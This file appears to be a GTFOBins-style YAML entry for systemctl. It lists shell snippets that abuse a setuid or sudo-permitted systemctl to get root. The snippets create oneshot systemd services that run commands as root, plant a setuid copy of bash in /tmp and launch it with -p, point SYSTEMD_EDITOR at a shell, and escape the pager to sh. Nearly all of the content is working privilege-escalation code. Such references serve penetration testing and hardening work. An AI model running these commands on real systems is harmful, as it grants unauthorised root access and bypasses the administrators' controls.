---
functions:
  suid:
    - code: |
        TF=$(mktemp).service
        echo '[Service]
        Type=oneshot
        ExecStart=/bin/sh -c "id > /tmp/output"
        [Install]
        WantedBy=multi-user.target' > $TF
        ./systemctl link $TF
        ./systemctl enable --now $TF
    - code: |
        TF=$(mktemp).service
        echo '[Service]
        Type=oneshot
        ExecStart=/bin/sh -c "cp /bin/bash /tmp/shell && chmod +s+x /tmp/shell"
        [Install]
        WantedBy=multi-user.target' > $TF
        ./systemctl link $TF
        ./systemctl enable --now $TF
        /tmp/shell -p
  sudo:
    - code: |
        TF=$(mktemp)
        echo /bin/sh >$TF
        chmod +x $TF
        sudo SYSTEMD_EDITOR=$TF systemctl edit system.slice
    - code: |
        TF=$(mktemp).service
        echo '[Service]
        Type=oneshot
        ExecStart=/bin/sh -c "id > /tmp/output"
        [Install]
        WantedBy=multi-user.target' > $TF
        sudo systemctl link $TF
        sudo systemctl enable --now $TF
    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        sudo systemctl
        !sh
---
